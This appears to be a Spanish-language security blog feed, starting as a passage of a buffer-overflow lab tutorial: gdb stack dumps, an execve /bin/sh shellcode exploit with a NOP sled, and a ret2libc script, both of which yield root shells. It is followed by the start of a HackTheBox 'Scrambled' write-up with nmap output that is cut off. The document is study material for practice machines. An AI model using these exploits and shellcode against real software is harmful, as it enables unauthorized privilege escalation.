0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
  </li>
  <li>
    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
  </li>
  <li>
    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
</code></pre></div></div>

<ul>
  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>

<span class="c"># Usamos la dirección deseada en little endian</span>
eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>

<span class="c"># Salida del payload completo</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
Buf: j
      XRh//shh/bin��0�
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="ret2libc">Ret2libc</h2>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
  <li>
    <p>Vamos analizar el código.</p>
  </li>
  <li>
    <p>Esta es la función main.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret.png" />
</p>

<ul>
  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret1.png" />
</p>

<ul>
  <li>
    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
  </li>
  <li>
    <p>Comenzamos enviado 50 bytes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
Reading symbols from levelFour...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 50
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
EDX: 0x1
ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x413b4141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
1094402369 found at offset: 28
</code></pre></div></div>

<ul>
  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
</code></pre></div></div>

<ul>
  <li>Ahora definimos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 28

junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>

print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
<span class="c"># whoami</span>
root
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
</p>

<ul>
  <li>Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user <code class="language-plaintext highlighter-rouge">ksimpson</code>. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the <code class="language-plaintext highlighter-rouge">Public</code> share with the credentials of <code class="language-plaintext highlighter-rouge">ksimpson</code>, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account <code class="language-plaintext highlighter-rouge">SqlSvc</code> has a <code class="language-plaintext highlighter-rouge">Service Principal Name</code> (SPN) associated with it. An attacker can use this information to perform an attack that is knows as <code class="language-plaintext highlighter-rouge">kerberoasting</code> and get the hash of <code class="language-plaintext highlighter-rouge">SqlSvc</code>. After cracking the hash and acquiring the credentials for the <code class="language-plaintext highlighter-rouge">SqlSvc</code> account an attacker can perform a <code class="language-plaintext highlighter-rouge">silver ticket</code> attack to forge a ticket and impersonate the user <code class="language-plaintext highlighter-rouge">Administrator</code> on the remote MSSQL service. Enumeration of the database reveals the credentials for user <code class="language-plaintext highlighter-rouge">MiscSvc</code>, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a <code class="language-plaintext highlighter-rouge">.NET</code> application, which is listening on port <code class="language-plaintext highlighter-rouge">4411</code>. Reverse engineering the application reveals that it is using the insecure <code class="language-plaintext highlighter-rouge">Binary Formatter</code> class to transmit data, allowing the attacker to upload their own payload and get code execution as <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code> así como sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49686,49727 10.10.11.168 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 18:25 CST
Nmap scan report <span class="k">for </span>10.10.11.168
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-30 00:25:54Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-30T00:21:53
|_Not valid after:  2054-04-30T00:21:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|_    ERROR_UNKNOWN_COMMAND<span class="p">;</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>4/29%Time<span class="o">=</span>66303A95%P<span class="o">=</span>x86_64-pc-linux-gnu%r
SF:<span class="o">(</span>NULL,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,1D,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">
SF:0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,35,<span class="s2">"SCRAMBLECORP_OR
SF:DERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,35,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,1D,<span class="s2">"
SF:SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">"SCRAMBLECORP_ORDE
SF:RS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UN
SF:KNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>
